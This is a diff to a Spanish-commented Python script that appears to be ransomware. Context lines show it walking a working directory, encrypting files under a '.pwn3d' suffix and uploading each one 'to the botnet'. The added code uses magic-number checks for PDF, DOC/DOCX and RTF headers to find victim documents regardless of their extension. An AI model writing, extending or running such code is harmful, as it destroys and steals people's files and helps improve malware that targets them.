@@ -4,6 +4,7 @@ import getpass
 import os
 import requests
 import time
+import binascii
 from cryptography.fernet import Fernet
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
@@ -79,18 +80,37 @@ while True:
         # Ruta absoluta del archivo iterado en cuestión
         f = os.path.join(dir_trabajo, file)
         
-        # Comprueba que el archivo en cuestión es realmente un archivo
+        # Comprueba que el archivo en cuestión es realmente un archivoZ
         if os.path.isfile(f):
 
             # Obtiene la extensión del archivo
-            extensiones_requeridas = [".pdf", ".doc", ".docx", ".rtf", ".txt"]
+            extensiones_requeridas = [".txt"]
             extension = os.path.splitext(f)[-1].lower()
+
+            # Magic numbers para .pdf, .doc(x) y .rtf
+            pdf_magic_numbers = ['25504446']
+            doc_magic_numbers = ['D0CF11E0', '504B0304', 'ECEF786D']
+            rtf_magic_numbers = ['7B5C727466', '7B5C7274']
+
+            # Flag de archivo soportado. Por defecto falso, cambia a verdadero si es un .pdf, .doc(x) o .rtf
+            es_soportado = False
+
+            # Comprobación de magic numbers
+            comprueba_magic = open(f, 'rb').read()
+            
+            pdf_magic = binascii.hexlify(comprueba_magic[:4]).upper().decode('ascii')
+            doc_magic = binascii.hexlify(comprueba_magic[:4]).upper().decode('ascii')
+            rtf_magic = binascii.hexlify(comprueba_magic[:5]).upper().decode('ascii')
+
+            # Si el magic number coincide, cambiar el flag de archivo soportado a verdadero
+            if (pdf_magic in pdf_magic_numbers) or (doc_magic in doc_magic_numbers) or (rtf_magic in rtf_magic_numbers):
+                es_soportado = True
 
             # Nombre del archivo encriptado
             nombre_archivo_encriptado = f + ".pwn3d"
 
             # Comprueba que el archivo sea .pdf | .doc | .docx | .rtf | .txt
-            if extension in extensiones_requeridas:
+            if extension in extensiones_requeridas or es_soportado:
                 
                 # Sube el archivo a la botnet
                 abrir_archivo = open(f, "rb")
